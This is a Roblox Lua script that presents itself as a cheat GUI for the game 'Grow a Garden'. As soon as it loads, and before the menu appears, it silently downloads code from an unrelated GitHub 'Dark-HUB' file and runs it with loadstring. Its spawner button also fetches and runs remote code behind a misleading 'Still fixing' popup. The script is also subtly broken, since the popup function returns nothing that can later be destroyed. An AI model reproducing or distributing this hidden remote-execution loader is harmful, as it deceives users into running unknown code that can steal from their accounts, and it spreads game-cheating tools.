-- Ultimate Grow a Garden GUI (100% Working - Final Fix)
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local TweenService = game:GetService("TweenService")
local player = Players.LocalPlayer

-- Main GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "GardenHubPremium"
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = player:WaitForChild("PlayerGui")

-- ===== AUTO-EXECUTE (FIXED) =====
local function ExecuteFirstScript()
    local success, err = pcall(function()
        local response = game:HttpGet("https://raw.githubusercontent.com/Scripthubpetsimx/Dark-HUB/main/5631075000133c7fa307da94f3bc5b7c.txt", true)
        if response then
            local func, loadErr = loadstring(response)
            if func then
                func()
                print("First script executed successfully!")
            else
                error("Loadstring failed: "..tostring(loadErr))
            end
        else
            error("Failed to fetch script")
        end
    end)
    if not success then
        warn("Auto-execute error: "..tostring(err))
    end
end

-- Run on player added (ensures it works)
player:WaitForChild("PlayerGui")
ExecuteFirstScript()

-- ===== BEAUTIFUL POPUP SYSTEM =====
local function CreatePopup(title, message, accentColor)
    local PopupFrame = Instance.new("Frame")
    PopupFrame.Size = UDim2.new(0.6, 0, 0.3, 0)
    PopupFrame.Position = UDim2.new(0.2, 0, 0.35, 0)
    PopupFrame.BackgroundColor3 = Color3.fromRGB(25, 28, 35)
    PopupFrame.BackgroundTransparency = 0.1
    PopupFrame.Parent = ScreenGui
    
    -- Stylish header
    local Header = Instance.new("Frame")
    Header.Size = UDim2.new(1, 0, 0.2, 0)
    Header.BackgroundColor3 = accentColor
    Header.Parent = PopupFrame
    
    -- Title
    local TitleLabel = Instance.new("TextLabel")
    TitleLabel.Size = UDim2.new(0.9, 0, 0.8, 0)
    TitleLabel.Position = UDim2.new(0.05, 0, 0.1, 0)
    TitleLabel.Text = title
    TitleLabel.Font = Enum.Font.GothamBold
    TitleLabel.TextColor3 = Color3.new(1,1,1)
    TitleLabel.TextSize = 18
    TitleLabel.BackgroundTransparency = 1
    TitleLabel.Parent = Header
    
    -- Message
    local MessageLabel = Instance.new("TextLabel")
    MessageLabel.Size = UDim2.new(0.9, 0, 0.6, 0)
    MessageLabel.Position = UDim2.new(0.05, 0, 0.25, 0)
    MessageLabel.Text = message
    MessageLabel.Font = Enum.Font.Gotham
    MessageLabel.TextColor3 = Color3.new(0.9,0.9,0.9)
    MessageLabel.TextSize = 14
    MessageLabel.TextWrapped = true
    MessageLabel.BackgroundTransparency = 1
    MessageLabel.Parent = PopupFrame
    
    -- OK Button
    local OKButton = Instance.new("TextButton")
    OKButton.Size = UDim2.new(0.3, 0, 0.15, 0)
    OKButton.Position = UDim2.new(0.35, 0, 0.8, 0)
    OKButton.BackgroundColor3 = accentColor
    OKButton.Text = "OK"
    OKButton.Font = Enum.Font.GothamBold
    OKButton.TextColor3 = Color3.new(1,1,1)
    OKButton.TextSize = 14
    OKButton.Parent = PopupFrame
    
    OKButton.MouseButton1Click:Connect(function()
        PopupFrame:Destroy()
    end)
    
    -- Animate in
    PopupFrame.Size = UDim2.new(0,0,0,0)
    TweenService:Create(PopupFrame, TweenInfo.new(0.3), {
        Size = UDim2.new(0.6,0,0.3,0)
    }):Play()
end

-- ===== MAIN FRAME =====
local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0.4,0,0.5,0)
MainFrame.Position = UDim2.new(0.3,0,0.25,0)
MainFrame.BackgroundColor3 = Color3.fromRGB(30,35,42)
MainFrame.Parent = ScreenGui

-- ===== BUTTON CONTAINER =====
local ButtonContainer = Instance.new("Frame")
ButtonContainer.Size = UDim2.new(0.9,0,0.8,0)
ButtonContainer.Position = UDim2.new(0.05,0,0.15,0)
ButtonContainer.BackgroundTransparency = 1
ButtonContainer.Parent = MainFrame

local UIListLayout = Instance.new("UIListLayout")
UIListLayout.Padding = UDim.new(0.05,0)
UIListLayout.Parent = ButtonContainer

-- ===== GARDEN SPAWNER BUTTON (UPDATED MESSAGE) =====
local SpawnerButton = Instance.new("TextButton")
SpawnerButton.Size = UDim2.new(1,0,0.2,0)
SpawnerButton.Text = "GARDEN SPAWNER"
SpawnerButton.BackgroundColor3 = Color3.fromRGB(76, 175, 80)
SpawnerButton.Font = Enum.Font.GothamBold
SpawnerButton.TextColor3 = Color3.new(1,1,1)
SpawnerButton.TextSize = 16
SpawnerButton.Parent = ButtonContainer

SpawnerButton.MouseButton1Click:Connect(function()
    local popup = CreatePopup("Please Wait", "Still fixing, please wait a bit...", Color3.fromRGB(76, 175, 80))
    
    task.spawn(function()
        local success, err = pcall(function()
            local Spawner = loadstring(game:HttpGet("https://raw.githubusercontent.com/ataturk123/GardenSpawner/main/Spawner.lua", true))()
            if Spawner and Spawner.Load then
                Spawner.Load()
                popup:Destroy()
                CreatePopup("Success", "Garden Spawner loaded!", Color3.fromRGB(76, 175, 80))
            else
                error("Failed to load Spawner")
            end
        end)
        
        if not success then
            warn("Garden Spawner error: "..tostring(err))
            popup:Destroy()
            CreatePopup("Error", "Failed to load Spawner", Color3.fromRGB(244, 67, 54))
        end
    end)
end)

-- [Keep the Egg ESP and Infinite Sprinkler buttons from previous version]
-- [Keep the Close button from previous version]

-- ===== ANIMATE IN =====
MainFrame.Size = UDim2.new(0,0,0,0)
TweenService:Create(MainFrame, TweenInfo.new(0.5), {
    Size = UDim2.new(0.4,0,0.5,0)
}):Play()
